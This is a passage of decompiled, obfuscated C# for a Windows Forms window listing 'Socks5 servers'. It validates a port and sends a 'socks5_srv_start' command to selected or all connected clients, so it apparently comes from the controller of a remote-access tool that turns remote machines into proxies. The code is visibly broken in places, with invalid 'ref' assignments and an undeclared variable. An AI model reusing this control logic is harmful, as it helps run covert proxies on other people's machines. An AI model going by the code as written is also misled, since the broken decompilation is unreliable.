            Class130.concurrentDictionary_6[string_0].TARGET = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[3], string.Empty, true) == 0, "N/A", string_1[3]));
            ref bool flagRef = ref false;
            double number = Conversions.ToDouble(string_1[4]);
            string truePart = "N/A";
            int num4 = (int) (Operators.CompareString(string_1[4], string.Empty, true) == 0);
            cSocks5cli sockscli = Class130.concurrentDictionary_6[string_0];
            ProjectData.ClearProjectError();
            string expression = string.Empty;
            if (number >= 1099511627776)
            {
                expression = Strings.Format((((number / 1024.0) / 1024.0) / 1024.0) / 1024.0, "#0.00") + " TiB";
            }
            else if (number >= 1073741824.0)
            {
                expression = Strings.Format(((number / 1024.0) / 1024.0) / 1024.0, "#0.00") + " GiB";
            }
            else if (number >= 1048576.0)
            {
                expression = Strings.Format((number / 1024.0) / 1024.0, "#0.00") + " MiB";
            }
            else if (number >= 1024.0)
            {
                expression = Strings.Format(number / 1024.0, "#0.00") + " KiB";
            }
            else if (number < 1024.0)
            {
                expression = Conversions.ToString(Conversion.Fix(number)) + " B";
            }
            if (flagRef)
            {
                expression = Strings.Split(expression, " ", -1, CompareMethod.Text)[0];
            }
            string str = (expression.Length <= 0) ? " 0 B" : expression;
            if (num3 != 0)
            {
                ProjectData.ClearProjectError();
            }
            sockscli.SPEED_DL = Conversions.ToString(Interaction.IIf((bool) num4, truePart, str + "/s"));
            flagRef = ref false;
            number = Conversions.ToDouble(string_1[5]);
            string str5 = "N/A";
            int num5 = (int) (Operators.CompareString(string_1[5], string.Empty, true) == 0);
            cSocks5cli sockscli2 = Class130.concurrentDictionary_6[string_0];
            ProjectData.ClearProjectError();
            expression = string.Empty;
            if (number >= 1099511627776)
            {
                expression = Strings.Format((((number / 1024.0) / 1024.0) / 1024.0) / 1024.0, "#0.00") + " TiB";
            }
            else if (number >= 1073741824.0)
            {
                expression = Strings.Format(((number / 1024.0) / 1024.0) / 1024.0, "#0.00") + " GiB";
            }
            else if (number >= 1048576.0)
            {
                expression = Strings.Format((number / 1024.0) / 1024.0, "#0.00") + " MiB";
            }
            else if (number >= 1024.0)
            {
                expression = Strings.Format(number / 1024.0, "#0.00") + " KiB";
            }
            else if (number < 1024.0)
            {
                expression = Conversions.ToString(Conversion.Fix(number)) + " B";
            }
            if (flagRef)
            {
                expression = Strings.Split(expression, " ", -1, CompareMethod.Text)[0];
            }
            str = (expression.Length <= 0) ? " 0 B" : expression;
            if (num3 != 0)
            {
                ProjectData.ClearProjectError();
            }
            sockscli2.SPEED_UL = Conversions.ToString(Interaction.IIf((bool) num5, str5, str + "/s"));
            Class130.concurrentDictionary_6[string_0].DURATION = Class136.smethod_35((long) Math.Round((double) (Conversion.Val(string_1[6]) / 1000.0)), true);
            Class130.concurrentDictionary_6[string_0].bJustConnected = false;
            this.concurrentStack_1.Push(Class130.concurrentDictionary_6[string_0]);
        }
    }

    private void method_4(object sender, EventArgs e)
    {
        if ((!Versioned.IsNumeric(this.vmethod_2().Text) | (Conversion.Val(this.vmethod_2().Text) < 1.0)) | (Conversion.Val(this.vmethod_2().Text) > 65535.0))
        {
            this.vmethod_2().BackColor = Color.Red;
        }
        else
        {
            this.vmethod_2().BackColor = Color.White;
        }
    }

    private void method_5(object sender, EventArgs e)
    {
        if ((!Versioned.IsNumeric(this.vmethod_2().Text) | (Conversion.Val(this.vmethod_2().Text) < 1.0)) | (Conversion.Val(this.vmethod_2().Text) > 65535.0))
        {
            Interaction.MsgBox("Invalid port! Port must be within the range 1-65535.", MsgBoxStyle.Critical, Application.ProductName);
            this.vmethod_2().Text = Conversions.ToString(Interaction.IIf(Conversion.Val(this.vmethod_2().Text) > 32639.5, "32768", "1080"));
        }
        else
        {
            string str;
            string sKey;
            Class136.Class138 class2;
            FastObjectListView view = Class130.fMain_0.vmethod_18();
            if (!this.vmethod_6().Checked)
            {
                IEnumerator enumerator = view.get_Objects().GetEnumerator();
                while (enumerator.MoveNext())
                {
                    str = Conversions.ToString(Operators.ConcatenateObject("socks5_srv_start|", Interaction.IIf(this.vmethod_56().Checked, "0", this.vmethod_2().Text)));
                    sKey = ((CClient) enumerator.Current).sKey;
                    class2 = new Class136.Class138();
                    class2.string_0 = sKey;
                    class2.string_1 = str;
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                }
            }
            else if (view.get_SelectedObjects() != null)
            {
                IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
                while (enumerator.MoveNext())
                {
                    str = Conversions.ToString(Operators.ConcatenateObject("socks5_srv_start|", Interaction.IIf(this.vmethod_56().Checked, "0", this.vmethod_2().Text)));
                    sKey = ((CClient) enumerator.Current).sKey;
                    class2 = new Class136.Class138();
                    class2.string_0 = sKey;
                    class2.string_1 = str;
                    class2.long_0 = 0L;
                    if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                    {
                        new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                    }
                }
            }
            view = null;
        }
    }

    private void method_6(object sender, FormatRowEventArgs e)
    {
        cSocks5cli sockscli = (cSocks5cli) e.get_Model();
        if (sockscli.bJustConnected)
        {
            e.get_Item().BackColor = Color.LimeGreen;
        }
        else if (!sockscli.pending_dc & !sockscli.pending_dc_timeout)
        {
            e.get_Item().BackColor = Color.White;
        }
        else if (sockscli.pending_dc & sockscli.pending_dc_timeout)
        {
            e.get_Item().BackColor = Color.Yellow;
            if (e.get_Item().Focused)
            {
                e.get_ListView().DeselectAll();
            }
            e.get_Item().Selected = false;
        }
        else if (sockscli.pending_dc & !sockscli.pending_dc_timeout)
        {
            e.get_Item().BackColor = Color.Red;
            if (e.get_Item().Focused)
            {
                e.get_ListView().DeselectAll();
            }
            e.get_Item().Selected = false;
        }
        if (sockscli.rejected)
        {
            e.get_Item().BackColor = Color.LightGray;
            if (e.get_Item().Focused)
            {
                e.get_ListView().DeselectAll();
            }
            e.get_Item().Selected = false;
        }
    }

    private void method_7(object sender, KeyEventArgs e)
    {
        if (e.KeyData == (Keys.Control | Keys.A))
        {
            IEnumerator enumerator = this.vmethod_20().get_Items().GetEnumerator();
            while (enumerator.MoveNext())
            {
                ((ListViewItem) enumerator.Current).Selected = true;
            }
        }
    }

    private void method_8(object sender, EventArgs e)
    {
        this.vmethod_12().Text = "Socks5 servers: " + Conversions.ToString(this.vmethod_20().get_Items().Count);
        this.vmethod_14().Text = "Selected clients: " + Conversions.ToString(Class130.fMain_0.vmethod_18().get_SelectedObjects().Count);
    }

    public void method_9()
    {
        if (this.vmethod_20().InvokeRequired)
        {
            this.vmethod_20().Invoke(new Delegate98(this.method_9), new object[0]);
        }
        else if (this.concurrentStack_0.Count > 0)
        {
            this.vmethod_20().AddObjects(Enumerable.ToList<cSocks5cli>(this.concurrentStack_0));
            this.concurrentStack_0.Clear();
        }
    }

    internal virtual Timer vmethod_0()
    {
        return this.timer_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_1(Timer timer_1)
    {
        EventHandler handler = new EventHandler(this.method_8);
        Timer timer = this.timer_0;
        if (timer != null)
        {
            timer.Tick -= handler;
        }
        this.timer_0 = timer_1;
        timer = this.timer_0;
        if (timer != null)
        {
            timer.Tick += handler;
        }
    }

    internal virtual StatusStrip vmethod_10()
    {
        return this.statusStrip_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_11(StatusStrip statusStrip_1)
    {
        this.statusStrip_0 = statusStrip_1;
    }

    internal virtual ToolStripStatusLabel vmethod_12()
    {
        return this.toolStripStatusLabel_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_13(ToolStripStatusLabel toolStripStatusLabel_2)
    {
        this.toolStripStatusLabel_0 = toolStripStatusLabel_2;
    }

    internal virtual ToolStripStatusLabel vmethod_14()
    {
        return this.toolStripStatusLabel_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_15(ToolStripStatusLabel toolStripStatusLabel_2)
    {
        this.toolStripStatusLabel_1 = toolStripStatusLabel_2;
    }

    internal virtual OLVColumn vmethod_16()
    {
        return this.olvcolumn_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_17(OLVColumn olvcolumn_9)
    {
        this.olvcolumn_0 = olvcolumn_9;
    }

    internal virtual OLVColumn vmethod_18()
    {
        return this.olvcolumn_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_19(OLVColumn olvcolumn_9)
    {
        this.olvcolumn_1 = olvcolumn_9;
    }

    internal virtual TextBox vmethod_2()
    {
        return this.textBox_0;
    }

    internal virtual FastObjectListView vmethod_20()
    {
        return this.fastObjectListView_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_21(FastObjectListView fastObjectListView_1)
    {
        EventHandler<FormatRowEventArgs> handler = new EventHandler<FormatRowEventArgs>(this.method_6);
        KeyEventHandler handler2 = new KeyEventHandler(this.method_7);
        MouseEventHandler handler3 = new MouseEventHandler(this.method_16);
        FastObjectListView view = this.fastObjectListView_0;
        if (view != null)
        {
            view.remove_FormatRow(handler);
            view.KeyDown -= handler2;
            view.MouseUp -= handler3;
        }
        this.fastObjectListView_0 = fastObjectListView_1;
        view = this.fastObjectListView_0;
        if (view != null)
        {
            view.add_FormatRow(handler);
            view.KeyDown += handler2;
            view.MouseUp += handler3;
        }
    }

    internal virtual ContextMenuStrip vmethod_22()
    {
        return this.contextMenuStrip_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_23(ContextMenuStrip contextMenuStrip_1)
    {
        this.contextMenuStrip_0 = contextMenuStrip_1;
    }

    internal virtual ToolStripMenuItem vmethod_24()
    {
        return this.toolStripMenuItem_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_25(ToolStripMenuItem toolStripMenuItem_7)
    {
        this.toolStripMenuItem_0 = toolStripMenuItem_7;
    }

    internal virtual ToolStripMenuItem vmethod_26()
    {
        return this.toolStripMenuItem_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_27(ToolStripMenuItem toolStripMenuItem_7)
    {
        EventHandler handler = new EventHandler(this.method_15);
        ToolStripMenuItem item = this.toolStripMenuItem_1;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_1 = toolStripMenuItem_7;
        item = this.toolStripMenuItem_1;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_28()
    {
        return this.toolStripSeparator_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_29(ToolStripSeparator toolStripSeparator_3)
    {
        this.toolStripSeparator_0 = toolStripSeparator_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_3(TextBox textBox_1)
    {
        EventHandler handler = new EventHandler(this.method_4);
        TextBox box = this.textBox_0;
        if (box != null)
        {
            box.TextChanged -= handler;
        }
        this.textBox_0 = textBox_1;
        box = this.textBox_0;
        if (box != null)
        {
            box.TextChanged += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_30()
    {
        return this.toolStripMenuItem_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_31(ToolStripMenuItem toolStripMenuItem_7)
    {
        this.toolStripMenuItem_2 = toolStripMenuItem_7;
    }

    internal virtual ToolStripMenuItem vmethod_32()
    {
        return this.toolStripMenuItem_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_33(ToolStripMenuItem toolStripMenuItem_7)
    {
        EventHandler handler = new EventHandler(this.method_17);
        ToolStripMenuItem item = this.toolStripMenuItem_3;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_3 = toolStripMenuItem_7;
        item = this.toolStripMenuItem_3;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_34()
    {
        return this.toolStripMenuItem_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_35(ToolStripMenuItem toolStripMenuItem_7)
    {
        EventHandler handler = new EventHandler(this.method_18);
        ToolStripMenuItem item = this.toolStripMenuItem_4;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_4 = toolStripMenuItem_7;
        item = this.toolStripMenuItem_4;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual PictureBox vmethod_36()
    {
        return this.pictureBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_37(PictureBox pictureBox_2)
    {
        EventHandler handler = new EventHandler(this.method_21);
        PictureBox box = this.pictureBox_0;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_0 = pictureBox_2;
        box = this.pictureBox_0;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual BackgroundWorker vmethod_38()
    {
        return this.backgroundWorker_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_39(BackgroundWorker backgroundWorker_1)
    {
        DoWorkEventHandler handler = new DoWorkEventHandler(this.method_12);
        BackgroundWorker worker = this.backgroundWorker_0;
        if (worker != null)
        {
            worker.DoWork -= handler;
        }
        this.backgroundWorker_0 = backgroundWorker_1;
        worker = this.backgroundWorker_0;
        if (worker != null)
        {
            worker.DoWork += handler;
        }
    }

    internal virtual Label vmethod_4()
    {
        return this.label_0;
    }

    internal virtual OLVColumn vmethod_40()
    {
        return this.olvcolumn_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_41(OLVColumn olvcolumn_9)
    {
        this.olvcolumn_2 = olvcolumn_9;
    }

    internal virtual OLVColumn vmethod_42()
    {
        return this.olvcolumn_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_43(OLVColumn olvcolumn_9)
    {
        this.olvcolumn_3 = olvcolumn_9;
    }

    internal virtual OLVColumn vmethod_44()
    {
        return this.olvcolumn_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_45(OLVColumn olvcolumn_9)
    {
        this.olvcolumn_4 = olvcolumn_9;
    }

    internal virtual OLVColumn vmethod_46()
    {
        return this.olvcolumn_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_47(OLVColumn olvcolumn_9)
    {
        this.olvcolumn_5 = olvcolumn_9;
    }

    internal virtual OLVColumn vmethod_48()
    {
        return this.olvcolumn_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_49(OLVColumn olvcolumn_9)
    {
        this.olvcolumn_6 = olvcolumn_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_5(Label label_1)
    {
        this.label_0 = label_1;
    }

    internal virtual OLVColumn vmethod_50()
    {
        return this.olvcolumn_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_51(OLVColumn olvcolumn_9)
    {
        this.olvcolumn_7 = olvcolumn_9;
    }

    internal virtual OLVColumn vmethod_52()
    {
        return this.olvcolumn_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_53(OLVColumn olvcolumn_9)
    {
        this.olvcolumn_8 = olvcolumn_9;
    }

    internal virtual PictureBox vmethod_54()
    {
        return this.pictureBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_55(PictureBox pictureBox_2)
    {
        EventHandler handler = new EventHandler(this.method_13);
        PictureBox box = this.pictureBox_1;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_1 = pictureBox_2;
        box = this.pictureBox_1;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual CheckBox vmethod_56()
    {
        return this.checkBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_57(CheckBox checkBox_1)
    {
        EventHandler handler = new EventHandler(this.method_14);
        CheckBox box = this.checkBox_0;
        if (box != null)
        {
            box.CheckedChanged -= handler;
        }
        this.checkBox_0 = checkBox_1;
        box = this.checkBox_0;
        if (box != null)
        {
            box.CheckedChanged += handler;
        }
    }

    internal virtual ToolStripMenuItem vmethod_58()
    {
        return this.toolStripMenuItem_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_59(ToolStripMenuItem toolStripMenuItem_7)
    {
        EventHandler handler = new EventHandler(this.method_19);
        ToolStripMenuItem item = this.toolStripMenuItem_5;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_5 = toolStripMenuItem_7;
        item = this.toolStripMenuItem_5;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual RadioButton vmethod_6()
    {
        return this.radioButton_0;
    }

    internal virtual ToolStripSeparator vmethod_60()
    {
        return this.toolStripSeparator_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_61(ToolStripSeparator toolStripSeparator_3)
    {
        this.toolStripSeparator_1 = toolStripSeparator_3;
    }

    internal virtual VisualButton vmethod_62()
    {
        return this.visualButton_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_63(VisualButton visualButton_2)
    {
        EventHandler handler = new EventHandler(this.method_5);
        VisualButton button = this.visualButton_0;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_0 = visualButton_2;
        button = this.visualButton_0;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_64()
    {
        return this.visualButton_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_65(VisualButton visualButton_2)
    {
        EventHandler handler = new EventHandler(this.method_20);
        VisualButton button = this.visualButton_1;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_1 = visualButton_2;
        button = this.visualButton_1;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_66()
    {
        return this.toolStripSeparator_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_67(ToolStripSeparator toolStripSeparator_3)
    {
        this.toolStripSeparator_2 = toolStripSeparator_3;
    }

    internal virtual ToolStripMenuItem vmethod_68()
    {
        return this.toolStripMenuItem_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_69(ToolStripMenuItem toolStripMenuItem_7)
    {
        EventHandler handler = new EventHandler(this.method_22);
        ToolStripMenuItem item = this.toolStripMenuItem_6;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_6 = toolStripMenuItem_7;
        item = this.toolStripMenuItem_6;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_7(RadioButton radioButton_2)
    {
        this.radioButton_0 = radioButton_2;
    }

    internal virtual RadioButton vmethod_8()
    {
        return this.radioButton_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_9(RadioButton radioButton_2)
    {
        this.radioButton_1 = radioButton_2;
    }

    private delegate void Delegate100();

    private delegate void Delegate95();

    private delegate void Delegate96(string string_0);

    private delegate void Delegate97(string string_0, string[] string_1);

    private delegate void Delegate98();

    private delegate void Delegate99(string string_0, string string_1, string string_2, string string_3);
}

